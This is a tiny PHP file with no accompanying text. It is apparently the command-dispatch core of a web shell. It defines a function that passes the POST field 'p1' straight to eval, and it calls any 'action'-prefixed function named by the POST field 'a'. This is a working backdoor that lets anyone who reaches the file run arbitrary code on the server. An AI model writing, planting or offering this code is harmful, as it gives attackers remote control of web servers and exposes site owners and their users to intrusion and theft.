<?php
function actionRC() {
	eval($_POST['p1']);
}

if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
?>